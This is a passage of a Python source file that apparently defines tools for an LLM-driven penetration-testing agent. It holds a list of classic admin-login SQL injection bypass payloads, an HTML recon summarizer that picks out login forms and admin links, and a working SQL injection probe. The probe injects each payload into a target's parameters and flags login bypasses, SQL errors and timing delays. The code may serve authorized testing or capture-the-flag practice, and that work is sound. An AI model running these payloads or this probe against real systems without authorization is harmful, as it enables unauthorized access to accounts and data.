    return _truncate(snippet, 500)

# ----------------- Quick SQLi payload helper -----------------

ADMIN_BYPASS_PAYLOADS = [
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "admin' -- ",
    "admin' #",
    "admin' OR '1'='1",
    "' OR '1'='1' /*",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin"" --",
    "admin"" OR ""1""=""1",
]

def bypasspayloads(count: int = 10, format_type: str = "json") -> str:
    """Return up to <count> classic admin-login SQL-injection payloads.
    
    Args:
        count: Number of payloads to return (1-10)
        format_type: Output format - "json" for JSON array, "text" for line-separated
    """
    count = max(1, min(count, len(ADMIN_BYPASS_PAYLOADS)))
    payloads = ADMIN_BYPASS_PAYLOADS[:count]
    
    if format_type.lower() == "json":
        import json
        return json.dumps(payloads, indent=2)
    else:
        return "\n".join(payloads)

# ---------------- LLM-powered HTML summarizer -----------------

def summarize_html_with_llm(html_content: str, url: str = "") -> str:
    """Summarize HTML content using a cheap LLM model to extract key pentesting information."""
    if not openai_client or not html_content:
        return _extract_html_manually(html_content)
    
    # Truncate HTML if too long to save on input tokens
    if len(html_content) > 8000:
        html_content = html_content[:8000] + "...[truncated]"
    
    prompt = f"""Analyze this HTML page for penetration testing. Extract ONLY the key information:

1. FORMS: List each form with action, method, and input field names
2. LINKS: List interesting links (login, admin, api, etc.)
3. ERRORS: Any error messages or debug info
4. TECH: Technology stack indicators (frameworks, versions)
5. PARAMS: URL parameters or hidden fields

Be concise. Focus on security-relevant elements only.

URL: {url}
HTML:
{html_content}"""

    try:
        response = openai_client.chat.completions.create(
            model="gpt-4o-mini",  # Cheap model
            messages=[{"role": "user", "content": prompt}],
            max_tokens=400,
            temperature=0.1
        )
        
        summary = response.choices[0].message.content.strip()
        return f"=== LLM HTML ANALYSIS ===\n{summary}"
        
    except Exception as e:
        # Fallback to manual extraction
        return f"[LLM summarizer failed: {e}]\n{_extract_html_manually(html_content)}"

def _extract_html_manually(html_content: str) -> str:
    """Manual HTML extraction as fallback when LLM is unavailable."""
    if not BeautifulSoup or not html_content:
        return "No HTML content or BeautifulSoup unavailable"
    
    try:
        soup = BeautifulSoup(html_content, "html.parser")
        
        summary = ["=== MANUAL HTML ANALYSIS ==="]
        
        # Extract forms
        forms = soup.find_all("form")
        if forms:
            summary.append("\nFORMS:")
            for i, form in enumerate(forms[:3]):  # Limit to 3 forms
                action = form.get("action", "")
                method = form.get("method", "GET").upper()
                inputs = [inp.get("name", f"unnamed_{inp.get('type', 'text')}") 
                         for inp in form.find_all("input") if inp.get("name")]
                summary.append(f"  Form {i+1}: {method} {action} - Fields: {', '.join(inputs)}")
        
        # Extract interesting links
        links = []
        for a in soup.find_all("a", href=True):
            href = a["href"].strip()
            if any(keyword in href.lower() for keyword in ["login", "admin", "api", "auth", "signin"]):
                links.append(href)
        if links:
            summary.append(f"\nINTERESTING LINKS: {', '.join(links[:5])}")
        
        # Look for error messages
        error_indicators = soup.find_all(string=lambda text: text and any(
            word in text.lower() for word in ["error", "exception", "debug", "sql", "mysql"]
        ))
        if error_indicators:
            summary.append(f"\nERROR INDICATORS: {len(error_indicators)} found")
        
        # Technology indicators
        tech_indicators = []
        if soup.find("meta", {"name": "generator"}):
            tech_indicators.append(soup.find("meta", {"name": "generator"}).get("content", ""))
        for script in soup.find_all("script", src=True):
            src = script["src"]
            if any(tech in src.lower() for tech in ["jquery", "bootstrap", "angular", "react", "vue"]):
                tech_indicators.append(src.split("/")[-1])
        if tech_indicators:
            summary.append(f"\nTECH STACK: {', '.join(tech_indicators[:3])}")
        
        return "\n".join(summary)
        
    except Exception as e:
        return f"Manual HTML extraction failed: {e}"

# ---------------- Parameterised SQLi probe -----------------
#temporarily disabled
SUCCESS_KEYWORDS = [
    "log in", "logged in", "welcome", "dashboard", "admin", "flag", "congratulations", "you are now", "logout"]
ERROR_KEYWORDS = [
    "sql", "syntax", "warning", "error", "mysql", "odbc", "sqlite", "pg_", "near", "unclosed quotation", "unterminated","failed"]


def sqli_probe(
        url: str,
        method: str = "POST",
        params: list[str] | None = None,
        payloads: list[str] | None = None,
        headers: dict[str, str] | None = None,
        timeout: int = 15,
        blind_delay: float = 5.0,
) -> str:
    """Heuristic SQL-injection tester.

    The caller supplies a list of *payloads*; the function injects each payload
    into each parameter one-at-a-time, compares the response to a baseline and
    flags anomalies (status change, length delta, SQL error text, time delay,
    or obvious login success keywords).
    """
    if payloads is None:
        return "[sqli_probe] No payloads provided"

    sess = requests.Session()
    if headers is None:
        headers = {}

    # Derive param names if not supplied
    if params is None or not params:
        parsed = urlparse(url)
        qs_params = [p.split("=")[0] for p in parsed.query.split("&") if "=" in p]
        params = qs_params or ["username", "password"]

    # baseline
    data_blank = {p: "" for p in params}
    try:
        base_resp = sess.request(method.upper(), url, data=data_blank if method.upper() == "POST" else None,
                                 headers=headers, timeout=timeout, verify=False)
    except Exception as e:
        return f"[sqli_probe] baseline request failed: {e}"

    base_len = len(base_resp.text)
    base_status = base_resp.status_code

    findings: list[str] = []
    for p in params:
        vuln = False
        evidence = ""
        for pl in payloads:
            inj_data = data_blank.copy()
            inj_data[p] = pl
            start = time.monotonic()
            try:
                r = sess.request(method.upper(), url, data=inj_data if method.upper() == "POST" else None,
                                  headers=headers, timeout=timeout+blind_delay, verify=False)
            except Exception as e:
                findings.append(f"{p}: request error {e}")
                continue
            delta_t = time.monotonic() - start
            diff_len = abs(len(r.text) - base_len)
            status_change = r.status_code != base_status
            error_hit = any(k in r.text.lower() for k in ERROR_KEYWORDS)
            success_hit = any(k in r.text.lower() for k in SUCCESS_KEYWORDS)
            slow = delta_t > blind_delay
            if status_change or diff_len > 30 or error_hit or slow or success_hit:
                evidence_parts = []
                if status_change:
                    evidence_parts.append(f"status {base_status}->{r.status_code}")
                if diff_len > 30:
                    evidence_parts.append(f"len {base_len}->{len(r.text)}")
                if error_hit:
                    evidence_parts.append("SQL-error keyword")
                if success_hit:
                    evidence_parts.append("login-indicator keyword")
                if slow:
                    evidence_parts.append(f"delay {delta_t:.1f}s")

                evidence_str = '; '.join(evidence_parts)

                if success_hit:
                    findings.append(f"LOGIN_BYPASS {p}: {evidence_str} | payload={pl[:30]}")
                else:
                    findings.append(f"LIKELY_VULN {p}: {evidence_str} | payload={pl[:30]}")
                vuln = True
                break  # stop further payloads for this param
        if not vuln:
            findings.append(f"CLEAN {p}: no anomalies across {len(payloads)} payloads")

    summary = [
        "=== SQLI PROBE REPORT ===",
        f"Target: {method.upper()} {url}",
        *findings
    ]
    return "\n".join(summary)

sqli_probe_tool = FunctionTool(
    sqli_probe,
    name="sqli_probe_tool",
    description="Heuristic SQLi tester. Provide params and payloads list; returns LIKELY_VULN lines when anomalies detected."
)

# ---------------- Report Writing Tool -----------------

def writereport(filename: str, content: str) -> str:
    """Write a penetration testing report to a text file.
    
    Args:
        filename: Name of the file to create (without .txt extension)
        content: The full report content to write
    
    Returns:
        Success message with file path or error message
    """
    try:
        # Ensure filename has .txt extension
        if not filename.endswith('.txt'):
            filename += '.txt'
        
        # Sanitize filename to prevent path traversal
        filename = os.path.basename(filename)
        
        # Write the report
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
        
        # Get absolute path for confirmation
        abs_path = os.path.abspath(filename)
        
        return f"Report successfully written to: {abs_path}"
        
    except Exception as e:
        return f"[writereport error] Failed to write report: {e}"

